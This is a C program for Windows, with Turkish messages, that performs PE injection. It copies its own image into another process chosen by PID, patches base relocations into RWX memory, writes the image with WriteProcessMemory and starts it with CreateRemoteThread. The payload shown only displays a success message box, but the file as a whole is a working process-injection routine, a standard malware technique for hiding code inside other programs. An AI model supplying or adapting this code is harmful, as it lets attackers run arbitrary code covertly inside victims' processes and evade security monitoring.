#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

typedef struct Module {
	HMODULE PEFile;
	DWORD imageSize;
	PIMAGE_DOS_HEADER DOSHeader;
	PIMAGE_NT_HEADERS NTHeader;
	PIMAGE_DATA_DIRECTORY DataDirectory;
}Module, *PModule;

Module module;

void DisplayMessageBox();
void initial();

void main(int argc, char* argv[])
{
	
	if (argc < 2)
	{
		printf("PE injection yapmak istediginiz processin adini veya pid numarasini giriniz!\n");
		exit(EXIT_FAILURE);
	}
	
	DWORD pid = atoi(argv[1]);
	initial();
	printf("%p\n%p\n%p\n%p\n%p\n",module.PEFile, module.DOSHeader, module.NTHeader, module.DataDirectory, module.PEFile+600);

	LPVOID VirtualMemOnCurrProc = VirtualAlloc(NULL, module.imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!VirtualMemOnCurrProc) {
		printf("Bu programin calistigi process uzerinde yer tahsis edilemedi!");
		exit(EXIT_FAILURE);
	}

	memcpy(VirtualMemOnCurrProc, module.PEFile, module.imageSize);

	HANDLE targetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (!targetProc) {
		printf("Hafizasina enjekte edilecek process acilamadi!");
		exit(EXIT_FAILURE);
	}
	
	LPVOID VirtualMemOnTargetProc = VirtualAllocEx(targetProc, NULL, module.imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!VirtualMemOnTargetProc) {
		printf("Hedef processte yer tahsis edilemedi!");
		exit(EXIT_FAILURE);
	}

	DWORD relocRVA = module.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	
	PIMAGE_BASE_RELOCATION baseRelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)VirtualMemOnCurrProc + relocRVA); 

	DWORD numberOfEntry;
	int counter = 1;

	DWORD_PTR delta = (DWORD_PTR)VirtualMemOnTargetProc - (DWORD_PTR)module.PEFile;
		
	while (baseRelocationTable->VirtualAddress != 0) {
		numberOfEntry = (baseRelocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		LPWORD entryList = (LPWORD)((DWORD_PTR)baseRelocationTable + sizeof(IMAGE_BASE_RELOCATION));

		for (int i = 0; i < numberOfEntry; i++) {
			DWORD_PTR* p = (DWORD_PTR*)((LPBYTE)VirtualMemOnCurrProc + (baseRelocationTable->VirtualAddress + ((entryList[i]) & 0x0FFF)));
			*p += delta;
		}

		baseRelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)baseRelocationTable + baseRelocationTable->SizeOfBlock);
		
		counter++;
	}
	SIZE_T numberOfBytes;
	if (WriteProcessMemory(targetProc, VirtualMemOnTargetProc, VirtualMemOnCurrProc, module.imageSize, &numberOfBytes) == 0) {
		printf("Hedef process'e inject islemi basarisiz!");
		exit(EXIT_FAILURE);
	}
	else {
		printf("Inject basarili\nMevcut Image Size:%d\ninject edilen Image Size:%d", module.imageSize, numberOfBytes);
		
		
		if (!CreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)DisplayMessageBox + delta), NULL, 0, NULL)) {
			printf("Thread olusturulamadi!");
			exit(EXIT_FAILURE);
		}
	}
		

}

void DisplayMessageBox() {
	MessageBoxA(NULL, (LPCSTR)"Injection basariyla gerceklesti", (LPCSTR)"Injection", MB_ICONWARNING | MB_OK);
	exit(EXIT_SUCCESS);
}

void initial() {
	module.PEFile = GetModuleHandle(NULL);
	module.DOSHeader = (PIMAGE_DOS_HEADER)module.PEFile;
	module.NTHeader = (PIMAGE_NT_HEADERS)((long long)module.PEFile + module.DOSHeader->e_lfanew);
	module.imageSize = module.NTHeader->OptionalHeader.SizeOfImage;
	module.DataDirectory = (PIMAGE_DATA_DIRECTORY)module.NTHeader->OptionalHeader.DataDirectory;
}